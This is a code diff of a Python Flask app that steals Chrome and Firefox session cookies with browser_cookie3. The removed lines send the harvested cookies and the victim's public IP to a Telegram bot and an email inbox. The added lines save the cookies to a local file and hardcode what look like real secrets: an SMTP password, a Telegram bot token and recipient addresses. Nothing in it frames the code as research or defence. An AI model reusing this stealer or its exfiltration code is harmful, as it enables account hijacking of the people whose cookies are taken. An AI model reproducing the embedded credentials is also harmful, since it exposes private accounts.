@@ -1,38 +1,25 @@
 import json
-import requests
 import os
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from flask import Flask, request
+from flask import Flask, jsonify
 import browser_cookie3
-from datetime import datetime
-import io
+import requests
 
 app = Flask(__name__)
 
-TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
-TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
+COOKIES_DIR = 'cookies'  # Directory to save cookies files
+os.makedirs(COOKIES_DIR, exist_ok=True)
 
-# Email settings
-SMTP_SERVER = os.environ.get('SMTP_SERVER')
-SMTP_PORT = int(os.environ.get('SMTP_PORT'))
-EMAIL_ADDRESS = os.environ.get('EMAIL_ADDRESS')
-EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD')
-RECIPIENT_EMAIL = os.environ.get('RECIPIENT_EMAIL')
+SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp.hostinger.com')
+SMTP_PORT = int(os.environ.get('SMTP_PORT', 465))
+EMAIL_ADDRESS = os.environ.get('EMAIL_ADDRESS', 'mail@lbrealty.online')
+EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', 'Johnson8666@')
+RECIPIENT_EMAIL = os.environ.get('RECIPIENT_EMAIL', 'w.sp4ce@yandex.com')
 
-SECRET_TOKEN = 'your-secret-token'
+TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '5444520238:AAHo9DY-sSdKi6wh36WEpTTLA2S5V6Pc5A8')
+TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '@blavkcap')
 
-def get_public_ip():
-    try:
-        response = requests.get('https://httpbin.org/ip')
-        ip_data = response.json()
-        return ip_data['origin']
-    except Exception as e:
-        print(f"Error fetching IP: {e}")
-        return "IP not found"
-
-def get_all_cookies():
+@app.route('/collect-cookies')
+def collect_cookies():
     all_cookies = {}
     browsers = ['chrome', 'firefox']
 
@@ -43,8 +30,8 @@ def get_all_cookies():
                 cookies = browser_cookie3.chrome()
             elif browser == 'firefox':
                 cookies = browser_cookie3.firefox()
-            cookie_list = []
 
+            cookie_list = []
             for cookie in cookies:
                 cookie_dict = {
                     'domain': cookie.domain or '',
@@ -60,79 +47,12 @@ def get_all_cookies():
             print(f"Successfully loaded cookies from {browser}")
         except Exception as e:
             print(f"{browser.capitalize()} error: {e}")
-            import traceback
-            traceback.print_exc()
 
-    return all_cookies
+    output_file = os.path.join(COOKIES_DIR, 'cookies.json')
+    with open(output_file, 'w') as f:
+        json.dump(all_cookies, f, indent=4)
 
-def get_cookies_as_string(cookies, ip_address):
-    cookie_string = io.StringIO()
-    cookie_string.write(f"User IP Address: {ip_address}\n\n")
-    for browser, cookie_list in cookies.items():
-        cookie_string.write(f"{browser.capitalize()} Cookies:\n")
-        for cookie in cookie_list:
-            cookie_string.write(f"\tName: {cookie['name']}\n")
-            cookie_string.write(f"\t\tValue: {cookie['value']}\n")
-            cookie_string.write(f"\t\tDomain: {cookie['domain']}\n")
-            cookie_string.write(f"\t\tPath: {cookie['path']}\n")
-            cookie_string.write(f"\t\tSecure: {'Yes' if cookie['secure'] else 'No'}\n")
-            expires = cookie['expires']
-            if expires:
-                cookie_string.write(f"\t\tExpires: {expires} ({datetime.utcfromtimestamp(int(expires)).strftime('%Y-%m-%d %H:%M:%S')})\n")
-            else:
-                cookie_string.write("\t\tExpires: None\n")
-        cookie_string.write("\n")
-    return cookie_string.getvalue()
-
-def send_cookies_to_telegram(cookies):
-    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
-    payload = {
-        'chat_id': TELEGRAM_CHAT_ID,
-        'text': cookies
-    }
-    response = requests.post(url, data=payload)
-    return response
-
-def send_cookies_to_email(cookies):
-    msg = MIMEMultipart()
-    msg['From'] = EMAIL_ADDRESS
-    msg['To'] = RECIPIENT_EMAIL
-    msg['Subject'] = 'Cookies Data'
-
-    msg.attach(MIMEText(cookies, 'plain'))
-
-    server = smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT)
-    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
-    text = msg.as_string()
-    server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, text)
-    server.quit()
-
-@app.route('/')
-def index():
-    return "Click the link to collect cookies: <a href='/collect?token={SECRET_TOKEN}'>Collect Cookies</a>"
-
-@app.route('/collect')
-def collect_cookies():
-    token = request.args.get('token')
-    if token != SECRET_TOKEN:
-        return "Unauthorized", 403
-
-    ip_address = get_public_ip()
-    print(f"User IP Address: {ip_address}")
-
-    cookies = get_all_cookies()
-    print(f"Collected cookies: {cookies}")
-
-    cookies_string = get_cookies_as_string(cookies, ip_address)
-    print(f"Cookies string: {cookies_string}")
-
-    response = send_cookies_to_telegram(cookies_string)
-    print(f"Telegram response: {response.text}")
-
-    send_cookies_to_email(cookies_string)
-    print("Email sent successfully")
-    
-    return "Cookies collected and sent successfully."
+    return "Cookies collected and saved."
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5004)
